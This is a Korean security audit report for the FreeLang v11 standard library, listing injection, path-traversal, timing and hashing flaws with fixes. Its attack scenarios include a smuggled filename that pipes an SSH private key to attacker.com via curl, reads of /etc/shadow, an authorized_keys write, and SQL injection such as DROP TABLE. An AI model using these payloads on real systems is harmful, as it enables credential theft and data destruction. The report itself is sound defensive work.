# FreeLang v11 — 보안 감사 보고서

> **감사 일자**: 2026-05-13  
> **감사 버전**: v11.7.4 (commit ad7f3515)  
> **감사 범위**: stdlib 전체 · HTTP 서버 · DB 드라이버 · 인증 모듈  
> **감사자**: Claude Sonnet 4.6 (Security Auditor)

---

## 종합 평가

| 영역 | 점수 | 등급 |
|------|------|------|
| 인증 / 암호화 | 85/100 | B+ |
| DB 보안 | 62/100 | D+ |
| 입력 검증 | 55/100 | D |
| 파일 / 쉘 보안 | 40/100 | F |
| HTTP 서버 | 75/100 | C+ |
| **종합** | **63/100** | **D+** |

> **등급 강등 이유**: CRITICAL 4건이 상업용 배포 전 반드시 패치되어야 하는 수준.  
> 내부 도구·신뢰 환경에서는 현재 상태로 운영 가능. 외부 노출 API는 패치 필수.

---

## CRITICAL — 즉시 패치 필요

### C-1. Command Injection — `stdlib-shell.ts`

**심각도**: CRITICAL  
**위치**: `stdlib-shell.ts:14, 25, 37, 48`

```typescript
// 현재 — 취약
spawnSync("sh", ["-c", cmd], { encoding: "utf-8" })
```

`shell()`, `shell_status()`, `shell_ok()`, `shell_pipe()`, `shell_capture()` 모두 사용자 입력을 `sh -c <cmd>`로 직접 실행한다. 런타임 레벨 검증 없음.

**공격 시나리오**:
```lisp
;; 사용자가 입력한 파일명이 shell()로 전달되는 경우
(shell (str "convert " user-filename " output.png"))
;; user-filename = "x; curl http://attacker.com/$(cat /root/.ssh/id_rsa)"
;; → SSH 개인키 외부 유출
```

**수정 방법**:
```typescript
// 앱 레벨에서 사용자 입력은 항상 인자 배열로 분리
// stdlib에 args-only 실행 함수 추가 권장
"shell-safe": (program: string, args: string[]) =>
  spawnSync(program, args, { encoding: "utf-8" })
```

**임시 완화**: 사용자 입력을 `shell()`에 직접 전달하는 패턴을 코드 리뷰로 차단.

---

### C-2. Path Traversal — `stdlib-file.ts`

**심각도**: CRITICAL  
**위치**: `stdlib-file.ts:15, 24, 57` (file_read, file_write, file_append)

```typescript
// 현재 — 취약
fs.readFileSync(filePath, "utf-8")  // 경로 검증 없음
```

`file-read`, `file-write`, `file-append`, `file-delete` 모두 경로 검증 없이 절대경로 포함 모든 경로를 허용.  
참고: `server_static`은 이미 올바르게 구현되어 있음 (`stdlib-http-server.ts:397`).

**공격 시나리오**:
```lisp
(file-read "../../etc/shadow")
(file-write "/root/.ssh/authorized_keys" attacker-pubkey)
```

**수정 방법**:
```typescript
function validatePath(filePath: string, allowedBase?: string): string {
  const resolved = path.resolve(filePath);
  if (allowedBase && !resolved.startsWith(path.resolve(allowedBase))) {
    throw new Error(`Path traversal 차단: ${filePath}`);
  }
  return resolved;
}
```

환경변수 `FL_FILE_BASE`로 허용 디렉터리 제한 권장.

---

### C-3. SQL Injection — `stdlib-db.ts` (테이블명·WHERE 절)

**심각도**: CRITICAL  
**위치**: `stdlib-db.ts:143, 152, 158`

```typescript
// 현재 — 취약
db.prepare(`INSERT INTO ${table} ...`).run(...)      // 테이블명 미검증
db.prepare(`UPDATE ${table} SET ${sets} WHERE ${where}`).run(...)  // where 문자열 직접 삽입
db.prepare(`DELETE FROM ${table} WHERE ${where}`)    // 동일
```

`table`, `where` 파라미터가 파라미터 바인딩 없이 SQL에 직접 삽입됨.

**공격 시나리오**:
```lisp
(db-delete-row db "users" "1=1")          ;; 전체 테이블 삭제
(db-update db "users" {:name "hack"} "id=1 OR 1=1")  ;; 전체 업데이트
```

**수정 방법**:
```typescript
// 테이블명 화이트리스트 검증
function validateIdentifier(name: string): string {
  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(name))
    throw new Error(`잘못된 식별자: ${name}`);
  return name;
}
// where는 구조화된 Map으로만 받기
```

---

### C-4. SQL Injection — `stdlib-db-query.ts` (컬럼명)

**심각도**: CRITICAL  
**위치**: `stdlib-db-query.ts:74, 84, 98, 110`

```typescript
// 현재 — 취약
const sql = `SELECT ${colStr} FROM ${table} ${whereSql}`;
// colStr = 사용자가 전달한 컬럼 배열을 join한 문자열
```

`columns` 배열 요소가 정규식 검증 없이 SQL에 삽입됨.

**공격 시나리오**:
```lisp
(db-select db "users" ["*; DROP TABLE users; --"] {})
```

**수정 방법**:
```typescript
const safeCol = (c: string) => {
  if (c === "*") return c;
  if (!/^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(c))
    throw new Error(`잘못된 컬럼명: ${c}`);
  return `\`${c}\``;
};
```

---

## HIGH — 주요 패치 권장

### H-1. MariaDB CLI 멀티스테이트먼트 — `stdlib-mariadb.ts:45`

**심각도**: HIGH

```typescript
args.push("--batch", "-e", sql);  // sql에 ; 포함 시 복수 쿼리 실행
```

`bindParams()`로 값은 이스케이프되지만, SQL 자체에 `;`를 포함하면 멀티스테이트먼트 실행 가능.

**수정 방법**: CLI 방식에서 `;` 포함 여부 사전 차단 (단, `BEGIN;...COMMIT;` 트랜잭션 구문 제외). 풀 방식(`mariadb_pool_*`) 사용을 기본으로 권장.

---

### H-2. Worker 내부 bindParams 이스케이프 불일치 — `stdlib-mariadb.ts:204`

**심각도**: HIGH

Worker Thread 내부 인라인 `bindParams`가 외부 `escapeString()`과 다른 구현:

| 이스케이프 문자 | 외부 `escapeString` | Worker 내부 |
|----------------|--------------------|-|
| `\0` (NULL byte) | ✅ 처리 | ❌ 미처리 |
| `\r` | ✅ 처리 | ❌ 미처리 |
| `\x1a` (Ctrl+Z) | ✅ 처리 | ❌ 미처리 |

**수정 방법**: Worker 내부 bindParams를 외부 escapeString과 동일하게 통일하거나, 메인 스레드에서 바인딩 완료 후 Worker에 전달.

---

### H-3. HTTP 임시파일 코드실행 — `stdlib-http.ts:22`

**심각도**: HIGH

```typescript
// 현재 — 위험
const tmpFile = `/tmp/fl-http-${uuid}.js`;
fs.writeFileSync(tmpFile, code);
execSync(`node ${tmpFile}`);
```

HTTP 요청마다 `/tmp`에 Node.js 파일 생성 후 실행. TOCTOU(Time-of-check Time-of-use) 경쟁 조건으로 파일 조작 시 임의 코드 실행 가능.

**수정 방법**: 임시파일 방식 제거. Node.js 내장 `https` 모듈을 직접 동기/비동기 호출로 대체.

---

### H-4. CSRF 토큰 타이밍 공격 — `stdlib-auth.ts:192`

**심각도**: HIGH

```typescript
// 현재 — 취약
return sig === expected;  // 문자열 직접 비교

// 동일 파일 JWT 서명 검증 — 올바른 구현
return timingSafeEqual(Buffer.from(a), Buffer.from(b));  // auth.ts:33
```

JWT는 `timingSafeEqual`을 사용하지만 CSRF 토큰 비교는 타이밍 사이드채널에 취약.

**수정 방법**:
```typescript
import { timingSafeEqual } from "crypto";
return sig.length === expected.length &&
  timingSafeEqual(Buffer.from(sig), Buffer.from(expected));
```

---

### H-5. 비밀번호 v1 레거시 해시 — `stdlib-auth.ts:136`

**심각도**: HIGH

```
v1 형식: salt:sha256hex  → GPU 브루트포스에 취약
v2 형식: scryptN=16384,r=8,p=1$...  → 안전
```

`auth_hash_password()`는 v2를 생성하지만 v1 해시가 DB에 존재하면 `auth_verify_password()`가 v1으로도 검증 통과.

**수정 방법**: 로그인 성공 시 `auth_password_needs_rehash()` 확인 후 즉시 v2로 재해싱하는 미들웨어 패턴을 CLAUDE.md에 표준으로 명시.

---

## MEDIUM — 보완 권장

| # | 위치 | 취약점 | 조치 |
|---|------|--------|------|
| M-1 | `stdlib-http-server.ts:465` | CORS `Access-Control-Allow-Origin: *` | `FL_ALLOWED_ORIGINS` 환경변수로 제어 |
| M-2 | `stdlib-http-server.ts:879` | Redirect URL에 `\r\n` 미필터 → 헤더 인젝션 | `url.replace(/[\r\n]/g, "")` |
| M-3 | `stdlib-http-server.ts:866` | 쿠키 `domain` 옵션 미검증 → 속성 위조 | `/^[a-zA-Z0-9.\-]+$/` 검증 |
| M-4 | `stdlib-http-server.ts:472` | CSP `'unsafe-inline'` 허용 | nonce/hash 기반 CSP로 전환 |
| M-5 | `stdlib-http-server.ts:482` | `X-Forwarded-For` 위조 → Rate Limit 우회 | 신뢰 프록시 설정 환경변수화 |

---

## LOW — 개선 권장

### L-1. JWT Decode 인증 사용 경고 누락

**위치**: `stdlib-auth.ts:58`

`auth_jwt_decode()`는 서명 검증 없이 페이로드 반환. 개발자가 이를 인증에 사용하는 실수 유발 가능.

**수정 방법**: 함수명을 `auth_jwt_decode_unsafe`로 변경하거나 주석에 "서명 미검증 — 인증 목적 사용 금지" 경고 명시.

### L-2. 에러 메시지에 SQL 노출

**위치**: `stdlib-mariadb.ts:78`

```typescript
throw new Error(`mariadb CLI 실패: ...\nSQL: ${sql.slice(0, 200)}`);
```

HTTP 응답으로 그대로 전달 시 쿼리 구조 노출.

**수정 방법**: `NODE_ENV=production`에서 SQL을 에러 메시지에서 제거하고 서버 로그에만 기록.

---

## PASS — 잘 구현된 보안 기능

| 기능 | 위치 | 평가 |
|------|------|------|
| JWT HS256 + `timingSafeEqual` | `stdlib-auth.ts:17-34` | ✅ |
| 비밀번호 scrypt v2 (N=16384) | `stdlib-auth.ts:113` | ✅ |
| SQLite prepared statement | `stdlib-db.ts:124-135` | ✅ |
| MariaDB bindParams (값 이스케이프) | `stdlib-mariadb.ts:105-155` | ✅ |
| `html-escape` 5종 (`& < > " '`) | `eval-builtins.ts:1677` | ✅ |
| `server_static` 경로 탐색 방지 | `stdlib-http-server.ts:397` | ✅ |
| 쿠키 HttpOnly + Secure + SameSite 기본값 | `stdlib-http-server.ts:860` | ✅ |
| CSRF HMAC + 60분 만료 | `stdlib-auth.ts:179` | ✅ |
| Rate Limiting (슬라이딩 윈도우) | `stdlib-http-server.ts:482` | ✅ |
| `js-escape` 인라인 JS 이스케이프 | `eval-builtins.ts` | ✅ |

---

## 수정 우선순위 로드맵

```
Phase 1 (즉시 — 1일):
  [ ] C-3, C-4  db 테이블명/컬럼명 식별자 검증
  [ ] H-4       CSRF timingSafeEqual 적용 (5분 작업)
  [ ] M-2       Redirect 헤더 \r\n 필터 (2분 작업)
  [ ] M-3       쿠키 domain 정규식 검증

Phase 2 (단기 — 1주):
  [ ] C-1       shell-safe 인자 배열 함수 추가 + 문서 경고
  [ ] C-2       file_read/write 경로 탐색 방지 (FL_FILE_BASE)
  [ ] H-1       MariaDB CLI 세미콜론 차단
  [ ] H-2       Worker bindParams 이스케이프 통일
  [ ] L-1       auth_jwt_decode 경고 명시

Phase 3 (중기 — 1개월):
  [ ] H-3       HTTP 임시파일 → 네이티브 https 모듈로 대체
  [ ] M-1       CORS 환경변수 제어
  [ ] M-4       CSP nonce 기반으로 전환
  [ ] H-5       비밀번호 v1 자동 재해싱 표준화
```

---

## 개발자 체크리스트

프로덕션 배포 전 반드시 확인:

```
보안 필수
[ ] 사용자 입력은 절대 shell() / shell-exec()에 직접 전달하지 않는다
[ ] file-read / file-write 경로는 서버 내 고정 디렉터리로 제한한다
[ ] db_insert / db_update / db_delete_row 테이블명은 하드코딩한다
[ ] db_run의 컬럼명 배열에 사용자 입력을 포함하지 않는다
[ ] html-escape — 사용자 입력은 반드시 이스케이프
[ ] CSRF 토큰 — form POST에 반드시 포함
[ ] auth_jwt_decode 결과를 인증 판단에 사용하지 않는다 (verify 사용)

권장
[ ] 환경변수 FL_FILE_BASE 설정으로 파일 접근 범위 제한
[ ] MariaDB 연결은 CLI 방식보다 pool 방식 우선 사용
[ ] NODE_ENV=production 설정 확인
```

---

*이 문서는 자동화 보안 감사 도구와 수동 코드 리뷰를 병행하여 작성되었습니다.*  
*다음 감사 예정: v11.8.0 또는 major 기능 추가 후*
